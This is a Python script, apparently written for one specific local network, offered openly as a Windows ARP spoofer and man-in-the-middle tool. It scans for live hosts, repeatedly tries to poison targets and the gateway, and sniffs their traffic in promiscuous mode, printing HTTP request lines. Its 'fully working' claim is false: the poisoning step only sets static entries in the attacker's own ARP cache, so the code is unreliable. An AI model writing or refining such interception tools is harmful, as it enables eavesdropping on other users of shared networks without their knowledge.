#!/usr/bin/env python3
"""
Bastion Security ARP Spoofer with Live Packet Display
Fully working with network detection and live traffic viewing
"""

import sys
import time
import subprocess
import threading
import socket
import os
import ctypes
import re
import platform
import struct
from collections import defaultdict
from datetime import datetime


class WorkingARPSpooferWithCapture:
    def __init__(self):
        # HARDCODED FOR YOUR NETWORK (from your earlier output)
        self.gateway_ip = "10.3.0.1"
        self.attacker_ip = "10.3.0.231"
        self.attacker_mac = "00:FF:79:6E:9F:02"

        self.targets = []
        self.gateway_mac = None
        self.running = False
        self.capturing = False
        self.is_windows = platform.system() == "Windows"
        self.captured_packets = []
        self.packet_count = 0
        self.capture_thread = None
        self.spoof_thread = None

        # Colors for Windows (ANSI codes)
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.BLUE = '\033[94m'
        self.MAGENTA = '\033[95m'
        self.CYAN = '\033[96m'
        self.WHITE = '\033[97m'
        self.GRAY = '\033[90m'
        self.RESET = '\033[0m'
        self.BOLD = '\033[1m'

    def is_admin(self):
        """Check if running as administrator"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def get_gateway_mac(self):
        """Get gateway MAC address"""
        print(f"{self.CYAN}[*] Getting MAC for gateway {self.gateway_ip}...{self.RESET}")

        try:
            # Ping gateway to populate ARP cache
            subprocess.run(f"ping -n 2 -w 200 {self.gateway_ip}",
                           shell=True, capture_output=True)
            time.sleep(1)

            # Check ARP table
            arp_output = subprocess.run("arp -a", shell=True,
                                        capture_output=True, text=True).stdout

            for line in arp_output.split('\n'):
                if self.gateway_ip in line:
                    match = re.search(r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', line)
                    if match:
                        mac = match.group(0).replace("-", ":")
                        print(f"{self.GREEN}[+] Gateway MAC: {mac}{self.RESET}")
                        return mac

            print(f"{self.RED}[!] Could not find gateway MAC{self.RESET}")
            return None

        except Exception as e:
            print(f"{self.RED}[!] Error getting gateway MAC: {e}{self.RESET}")
            return None

    def scan_active_hosts(self):
        """Find active hosts on the network"""
        print(f"\n{self.CYAN}[*] Scanning for active hosts...{self.RESET}")

        network_prefix = "10.3.0"
        active_hosts = []

        # Common IPs to check
        common_ips = [2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 30, 40, 50,
                      100, 150, 200, 210, 220, 230, 240, 250, 254]

        for last_octet in common_ips:
            if not self.running:
                break

            target_ip = f"{network_prefix}.{last_octet}"

            # Skip our IP and gateway
            if target_ip in [self.attacker_ip, self.gateway_ip]:
                continue

            print(f"{self.GRAY}[*] Testing {target_ip}...{self.RESET}", end="\r")

            try:
                # Fast ping
                result = subprocess.run(
                    f"ping -n 1 -w 150 {target_ip}",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=1
                )

                if "Reply from" in result.stdout:
                    # Get MAC if possible
                    subprocess.run(f"ping -n 1 -w 100 {target_ip}",
                                   shell=True, capture_output=True)
                    time.sleep(0.5)

                    arp_output = subprocess.run("arp -a", shell=True,
                                                capture_output=True, text=True).stdout

                    mac = None
                    for line in arp_output.split('\n'):
                        if target_ip in line:
                            match = re.search(r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', line)
                            if match:
                                mac = match.group(0).replace("-", ":")
                                break

                    if mac:
                        active_hosts.append({"ip": target_ip, "mac": mac})
                        print(f"{self.GREEN}[+] Active host: {target_ip} - {mac}{self.RESET}")
                    else:
                        active_hosts.append({"ip": target_ip, "mac": "Unknown"})
                        print(f"{self.GREEN}[+] Active host: {target_ip} (MAC unknown){self.RESET}")

            except:
                continue

        print(f"\n{self.CYAN}[*] Found {len(active_hosts)} active hosts{self.RESET}")
        return active_hosts

    def start_packet_capture(self):
        """Start live packet capture"""
        print(f"\n{self.MAGENTA}[*] Starting live packet capture...{self.RESET}")
        print(f"{self.MAGENTA}[*] You will see network traffic below:{self.RESET}")
        print(f"{self.MAGENTA}[*] Press Ctrl+C to stop{self.RESET}\n")

        self.capturing = True
        self.capture_thread = threading.Thread(target=self.capture_packets_live)
        self.capture_thread.daemon = True
        self.capture_thread.start()

        # Give it time to start
        time.sleep(2)

    def capture_packets_live(self):
        """Capture and display packets in real-time"""
        try:
            # Create raw socket to capture packets
            sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            sniffer.bind((self.attacker_ip, 0))
            sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Enable promiscuous mode on Windows
            if self.is_windows:
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

            sniffer.settimeout(1)

            print(f"{self.GREEN}[✓] Packet capture started! Watching for traffic...{self.RESET}\n")

            while self.capturing and self.running:
                try:
                    packet, addr = sniffer.recvfrom(65535)
                    self.display_packet_info(packet, addr[0])

                except socket.timeout:
                    continue
                except Exception as e:
                    if self.capturing:  # Only print if we're still supposed to be capturing
                        print(f"{self.RED}[!] Capture error: {e}{self.RESET}")
                    break

            # Cleanup
            if self.is_windows:
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            sniffer.close()

        except Exception as e:
            print(f"{self.RED}[!] Failed to start packet capture: {e}{self.RESET}")
            print(f"{self.YELLOW}[*] Note: Raw socket capture requires admin privileges{self.RESET}")

    def display_packet_info(self, packet, src_ip):
        """Display packet information in a readable format"""
        self.packet_count += 1

        try:
            # Minimum packet size check
            if len(packet) < 20:
                return

            # Parse IP header (first 20 bytes)
            ip_header = packet[:20]
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)

            version_ihl = iph[0]
            ihl = version_ihl & 0xF
            iph_length = ihl * 4

            protocol = iph[6]
            src_addr = socket.inet_ntoa(iph[8])
            dst_addr = socket.inet_ntoa(iph[9])

            # Skip packets to/from ourselves
            if src_addr == self.attacker_ip or dst_addr == self.attacker_ip:
                return

            # Get current time
            timestamp = datetime.now().strftime("%H:%M:%S")

            # Determine protocol and color
            if protocol == 6:  # TCP
                color = self.BLUE
                proto_name = "TCP"

                # Try to get ports
                if len(packet) >= iph_length + 4:
                    tcp_header = packet[iph_length:iph_length + 20]
                    if len(tcp_header) >= 4:
                        src_port = struct.unpack('!H', tcp_header[:2])[0]
                        dst_port = struct.unpack('!H', tcp_header[2:4])[0]

                        # Check for HTTP/HTTPS
                        if dst_port == 80 or src_port == 80:
                            color = self.GREEN
                            proto_name = "HTTP"
                            self.display_http_info(packet[iph_length + 20:], color)
                        elif dst_port == 443 or src_port == 443:
                            color = self.YELLOW
                            proto_name = "HTTPS"
                        elif dst_port == 53 or src_port == 53:
                            color = self.CYAN
                            proto_name = "DNS"

                        print(
                            f"{color}[{timestamp}] {src_addr}:{src_port} → {dst_addr}:{dst_port} [{proto_name}]{self.RESET}")
                        return

            elif protocol == 17:  # UDP
                color = self.MAGENTA
                proto_name = "UDP"

                # Try to get ports
                if len(packet) >= iph_length + 4:
                    udp_header = packet[iph_length:iph_length + 8]
                    if len(udp_header) >= 4:
                        src_port = struct.unpack('!H', udp_header[:2])[0]
                        dst_port = struct.unpack('!H', udp_header[2:4])[0]

                        if dst_port == 53 or src_port == 53:
                            color = self.CYAN
                            proto_name = "DNS"

                        print(
                            f"{color}[{timestamp}] {src_addr}:{src_port} → {dst_addr}:{dst_port} [{proto_name}]{self.RESET}")
                        return

            elif protocol == 1:  # ICMP
                color = self.CYAN
                proto_name = "ICMP"
                print(f"{color}[{timestamp}] {src_addr} → {dst_addr} [{proto_name}]{self.RESET}")
                return

            else:
                color = self.GRAY
                proto_name = f"PROTO-{protocol}"

            # Generic display for other protocols
            print(f"{color}[{timestamp}] {src_addr} → {dst_addr} [{proto_name}]{self.RESET}")

            # Save packet info for summary
            self.captured_packets.append({
                'time': timestamp,
                'src': src_addr,
                'dst': dst_addr,
                'protocol': proto_name
            })

        except Exception as e:
            # Simplified display for any error
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"{self.GRAY}[{timestamp}] Packet from {src_ip}{self.RESET}")

    def display_http_info(self, data, color):
        """Display HTTP request/response info"""
        try:
            # Take first 100 bytes for analysis
            if len(data) > 100:
                data = data[:100]

            text = data.decode('utf-8', errors='ignore')

            # Look for HTTP methods or headers
            if 'GET ' in text or 'POST ' in text or 'HTTP/' in text:
                lines = text.split('\r\n')
                for line in lines:
                    if line and len(line) < 80:
                        if line.startswith('GET ') or line.startswith('POST ') or line.startswith('HTTP/'):
                            print(f"{color}    {line}{self.RESET}")
                            break
        except:
            pass

    def arp_poison(self, target_ip):
        """ARP poison a target"""
        try:
            # Method 1: Using arp -s (static entry)
            cmd = f"arp -s {target_ip} {self.attacker_mac}"
            result = subprocess.run(cmd, shell=True, capture_output=True)

            if result.returncode == 0:
                return True
            else:
                # Method 2: Try netsh for WiFi interface
                cmd = f"netsh interface ipv4 set neighbors name=\"Wi-Fi\" {target_ip} {self.attacker_mac}"
                subprocess.run(cmd, shell=True, capture_output=True)
                return True

        except:
            return False

    def start_attack_with_capture(self, targets):
        """Start ARP spoofing with live packet capture"""
        print(f"\n{self.BOLD}{'=' * 70}{self.RESET}")
        print(f"{self.BOLD}{self.RED}[*] ARP SPOOFING ATTACK ACTIVE - MITM ACTIVE{self.RESET}")
        print(f"{self.BOLD}[*] Your position: {self.attacker_ip}{self.RESET}")
        print(f"{self.BOLD}[*] Gateway: {self.gateway_ip}{self.RESET}")
        print(f"{self.BOLD}[*] Targets: {len(targets)} devices{self.RESET}")
        print(f"{self.BOLD}[*] Live packet capture ACTIVE{self.RESET}")
        print(f"{self.BOLD}{'=' * 70}{self.RESET}\n")

        # Start packet capture FIRST
        self.start_packet_capture()

        # Then start ARP spoofing
        self.running = True
        cycle = 0

        try:
            while self.running:
                cycle += 1
                success_count = 0

                # Show status every 5 cycles
                if cycle % 5 == 1:
                    print(
                        f"\n{self.YELLOW}[*] Attack Cycle #{cycle} - Packets captured: {self.packet_count}{self.RESET}")

                # Poison all targets
                for target in targets:
                    if not self.running:
                        break

                    if self.arp_poison(target["ip"]):
                        success_count += 1

                # Also poison gateway
                if self.running:
                    self.arp_poison(self.gateway_ip)

                # Wait between cycles
                for i in range(5):
                    if not self.running:
                        break
                    time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n{self.RED}[!] Attack stopped by user{self.RESET}")
        finally:
            self.stop_attack()

    def show_capture_summary(self):
        """Show capture summary at the end"""
        print(f"\n{self.BOLD}{'=' * 70}{self.RESET}")
        print(f"{self.BOLD}{self.CYAN}[*] CAPTURE SUMMARY{self.RESET}")
        print(f"{self.BOLD}{'=' * 70}{self.RESET}")

        if self.packet_count == 0:
            print(f"{self.YELLOW}[*] No packets captured during attack{self.RESET}")
            print(f"{self.YELLOW}[*] Possible reasons:{self.RESET}")
            print(f"{self.YELLOW}    - Network security (client isolation){self.RESET}")
            print(f"{self.YELLOW}    - No active traffic during attack{self.RESET}")
            print(f"{self.YELLOW}    - Raw socket permissions issue{self.RESET}")
            return

        print(f"{self.GREEN}[*] Total packets captured: {self.packet_count}{self.RESET}")

        # Show recent packets
        if self.captured_packets:
            print(f"\n{self.GREEN}[*] Recent activity:{self.RESET}")
            recent = self.captured_packets[-10:]  # Last 10 packets
            for packet in recent:
                color = self.BLUE if "TCP" in packet['protocol'] else self.MAGENTA if "UDP" in packet[
                    'protocol'] else self.CYAN
                print(
                    f"{color}    [{packet['time']}] {packet['src']} → {packet['dst']} [{packet['protocol']}]{self.RESET}")

    def stop_attack(self):
        """Stop attack and restore network"""
        self.running = False
        self.capturing = False

        print(f"\n{self.RED}[*] Stopping attack and restoring network...{self.RESET}")

        # Wait for threads to stop
        if self.capture_thread and self.capture_thread.is_alive():
            self.capture_thread.join(timeout=2)

        # Clear ARP cache
        print(f"{self.CYAN}[*] Clearing ARP cache...{self.RESET}")
        subprocess.run("arp -d *", shell=True, capture_output=True)

        # Show capture summary
        self.show_capture_summary()

        print(f"\n{self.GREEN}[✓] Network restoration complete{self.RESET}")
        print(f"{self.GREEN}[*] Bastion Security - Operation Complete{self.RESET}")

    def start(self):
        """Main execution"""
        # Banner
        print()
        print("╔══════════════════════════════════════════════════╗")
        print("║      ARP SPOOFER WITH LIVE PACKET DISPLAY        ║")
        print("║             Bastion Security                     ║")
        print("║          See traffic in real-time!               ║")
        print("╚══════════════════════════════════════════════════╝")
        print()

        # Check admin
        if not self.is_admin():
            print(f"{self.RED}[!] ERROR: Must run as Administrator!{self.RESET}")
            print(f"{self.RED}[!] Right-click CMD -> 'Run as Administrator'{self.RESET}")
            return

        print(f"{self.BLUE}[*] Bastion Security - Live MITM Attack{self.RESET}")
        print(f"{self.BLUE}[*] Hardcoded for your network:{self.RESET}")
        print(f"{self.BLUE}[*] Your IP: {self.attacker_ip}{self.RESET}")
        print(f"{self.BLUE}[*] Your MAC: {self.attacker_mac}{self.RESET}")
        print(f"{self.BLUE}[*] Gateway: {self.gateway_ip}{self.RESET}")
        print(f"{self.BLUE}[*] Network: 10.3.0.0/24{self.RESET}")
        print()

        # Get gateway MAC
        self.gateway_mac = self.get_gateway_mac()
        if not self.gateway_mac:
            print(f"{self.YELLOW}[*] Continuing with unknown gateway MAC{self.RESET}")

        # Scan for targets
        print()
        self.targets = self.scan_active_hosts()

        # Always include gateway
        if {"ip": self.gateway_ip, "mac": self.gateway_mac} not in self.targets:
            self.targets.append({"ip": self.gateway_ip, "mac": self.gateway_mac or "Unknown"})

        if len(self.targets) <= 1:
            print(f"{self.YELLOW}[!] Few targets found - may be due to network security{self.RESET}")

        # Show plan
        print(f"\n{self.CYAN}[*] Attack Plan:{self.RESET}")
        print(f"{self.CYAN}    Targets: {len(self.targets)} devices{self.RESET}")
        print(f"{self.CYAN}    Effect: MITM - All traffic through your machine{self.RESET}")
        print(f"{self.CYAN}    Live capture: You'll see packets in real-time{self.RESET}")

        # Warning
        print(f"\n{self.BOLD}{self.RED}{'!' * 70}{self.RESET}")
        print(f"{self.BOLD}{self.RED}[!] WARNING: This will disrupt network connectivity!{self.RESET}")
        print(f"{self.BOLD}{self.RED}[!] Other devices may lose internet connection!{self.RESET}")
        print(f"{self.BOLD}{self.RED}[!] Use only on networks you have permission to test!{self.RESET}")
        print(f"{self.BOLD}{self.RED}{'!' * 70}{self.RESET}")

        confirm = input(f"\n{self.YELLOW}[?] Launch attack with live packet capture? (yes/NO): {self.RESET}").lower()
        if confirm != "yes":
            print(f"{self.CYAN}[*] Operation cancelled{self.RESET}")
            return

        # Start attack
        self.start_attack_with_capture(self.targets)


def main():
    """Entry point"""
    # Enable ANSI colors on Windows 10+
    if platform.system() == "Windows":
        os.system("color")

    spoofer = WorkingARPSpooferWithCapture()

    try:
        spoofer.start()
    except KeyboardInterrupt:
        print(f"\n\n{spoofer.RED}[*] Operation cancelled by user{spoofer.RESET}")
        spoofer.stop_attack()
    except Exception as e:
        print(f"\n{spoofer.RED}[!] Error: {e}{spoofer.RESET}")
        import traceback
        traceback.print_exc()
        spoofer.stop_attack()


if __name__ == "__main__":
    main()